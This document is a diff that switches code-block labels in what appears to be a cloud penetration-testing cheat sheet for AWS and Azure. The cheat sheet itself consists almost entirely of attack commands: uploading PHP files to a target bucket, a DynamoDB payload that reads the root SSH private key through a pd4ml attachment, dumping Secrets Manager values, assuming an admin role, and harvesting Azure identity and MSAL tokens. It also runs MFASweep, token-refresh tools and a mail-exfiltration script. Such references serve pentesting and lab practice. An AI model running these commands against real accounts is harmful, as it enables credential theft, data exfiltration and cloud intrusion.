@@ -40,12 +40,12 @@
 
 ## AWS
 
-```c
+```console
 $ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
 $ sudo ./aws/install
 ```
 
-```c
+```console
 $ aws configure
 AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
@@ -55,112 +55,112 @@ Default output format [None]: json
 
 ### List Buckets
 
-```c
+```console
 $ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
 ```
 
 ### List Tables
 
-```c
+```console
 $ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
 ```
 
 ### List Users
 
-```c
+```console
 $ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
 ```
 
 ### Upload Files
 
-```c
+```console
 $ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
 ```
 
 ### Alternativ Upload Technique
 
-```c
+```console
 $ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
 ```
 
 ### Create Table
 
-```c
+```console
 $ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
 ```
 
 ### Extract Data into Table
 
-```c
+```console
 $ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
 ```
 
 ### List Keys
 
-```c
+```console
 $ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
 ```
 
 ### List Secrets
 
-```c
+```console
 $ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
 ```
 
 ### Get Secret Values
 
-```c
+```console
 $ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
 ```
 
 ### KMS Enable Key
 
-```c
+```console
 $ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
 ```
 
 ### KMS Decrypt
 
-```c
+```console
 $ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
 ```
 
 ### Abuse Access Control List (ACL) Misconfiguration
 
-```c
+```console
 $ aws s3 ls s3://{<BUCKET>} --no-sign-request
 $ aws s3 ls s3://<COMPANY>
 ```
 
 ### Searching for Usernames in JSON Files
 
-```c
+```console
 $ grep -r userName | sort -u
 $ grep -h -A 10 <USERNAME> <FILE>
 ```
 
 ### Get-Caller-Identity
 
-```c
+```console
 $ aws sts get-caller-identity
 ```
 
 ### Get-User-Policies
 
-```c
+```console
 $ aws iam list-user-policies --user-name <USERNAME>
 $ aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY>
 ```
 
 ### Assume-Role
 
-```c
+```console
 $ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name <SESSION>
 ```
 
 ### Set Session Token
 
-```c
+```console
 $ aws configure
 AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
@@ -168,13 +168,13 @@ Default region name [None]: us-west-2
 Default output format [None]: json
 ```
 
-```c
+```console
 $ aws configure set aws_session_token "IQo<--- SNIP --->xY="
 ```
 
 ### Access S3 Bucket
 
-```c
+```console
 $ aws configure
 AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
@@ -182,13 +182,13 @@ Default region name [None]: us-west-2
 Default output format [None]: json
 ```
 
-```c
+```console
 $ aws s3 ls s3://<BUCKET>
 ```
 
 ### Download from S3 Bucket
 
-```c
+```console
 $ aws s3 cp s3://<BUCKET>/<FILE> .
 ```
 
@@ -198,35 +198,35 @@ $ aws s3 cp s3://<BUCKET>/<FILE> .
 
 > https://learn.microsoft.com/en-us/cli/azure/
 
-```c
+```console
 $ az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
 ```
 
-```c
+```console
 $ az resource list
 ```
 
-```c
+```console
 $ az role assignment list --all
 ```
 
-```c
+```console
 $ az webapp ssh --resource-group <GROUP> --name <NAME>
 ```
 
-```c
+```console
 $ env
 ```
 
-```c
+```console
 $ env | grep IDENTITY
 ```
 
-```c
+```console
 $ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
 ```
 
-```c
+```console
 $ Connect-AzAccount -AccessToken
 ```
 
@@ -234,25 +234,25 @@ $ Connect-AzAccount -AccessToken
 
 > https://github.com/dafthack/MFASweep/
 
-```c
+```console
 PS /> Import-Module ./MFASweep.ps1
 PS /> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
 PS /> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
 ```
 
-```c
+```console
 PS /> cat  ~/.azure/msal_token_cache.json
 ```
 
 or
 
-```c
+```console
 PS /> cat  ~/.Azure/msal_token_cache.json
 ```
 
 > https://github.com/f-bader/TokenTacticsV2
 
-```c
+```console
 PS /> Import-Module .\TokenTactics.psm1
 PS /> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
 PS /> $MSGraphToken
@@ -261,7 +261,7 @@ PS /> $MSGraphToken.access_token
 
 or
 
-```c
+```console
 $ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
 ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
 ```
@@ -270,7 +270,7 @@ ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
 
 > https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py
 
-```c
+```console
 PS /> python3 exfil_exchange_mail.py
 ```
 
@@ -278,7 +278,7 @@ PS /> python3 exfil_exchange_mail.py
 
 > https://github.com/dafthack/GraphRunner
 
-```c
+```console
 $ pwsh
 PS> . ./GraphRunner.ps1
 PS> List-GraphRunnerModules
@@ -295,7 +295,7 @@ PS> Invoke-SecurityGroupCloner -Tokens $tokens
 
 > https://github.com/nahamsec/lazys3
 
-```c
+```console
 $ ruby lazys3.rb <DOMAIN>
 ```
 
@@ -303,30 +303,30 @@ $ ruby lazys3.rb <DOMAIN>
 
 ### Installation
 
-```c
+```console
 $ pipx install s3-account-search
 ```
 
 ### AWS Configuration
 
-```c
+```console
 $ aws configure
 ```
 
 ### Verify AWS Configuration
 
-```c
+```console
 $ aws sts get-caller-identity
 ```
 
 ### Get Region
 
-```c
+```console
 $ curl -I https://<RHOST>.s3.amazonaws.com
 ```
 
 ### Search S3 Account ID
 
-```c
+```console
 $ s3-account-search arn:aws:iam::422645307575:role/<BUCKET> <RHOST>
 ```
